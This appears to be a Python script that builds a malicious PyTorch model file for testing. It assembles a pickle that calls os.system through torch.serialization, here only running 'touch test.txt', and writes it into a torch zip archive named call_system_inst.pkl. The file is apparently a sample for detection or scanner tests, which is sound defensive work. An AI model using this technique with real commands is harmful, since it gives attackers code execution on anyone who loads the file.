import io

import torch
from pickleassem import PickleAssembler
from torch.serialization import _open_zipfile_writer

if __name__ == "__main__":

    pa = PickleAssembler(proto=4)

    pa.push_mark()
    pa.push_short_binstring("touch test.txt")
    pa.build_inst("torch", "serialization.os.system")

    payload = pa.assemble()

    data = io.BytesIO()
    data.write(payload)
    data.seek(0)

    data_value = data.getvalue()
    with _open_zipfile_writer("call_system_inst.pkl") as zip_file:
        zip_file.write_record("data.pkl", data_value, len(data_value))
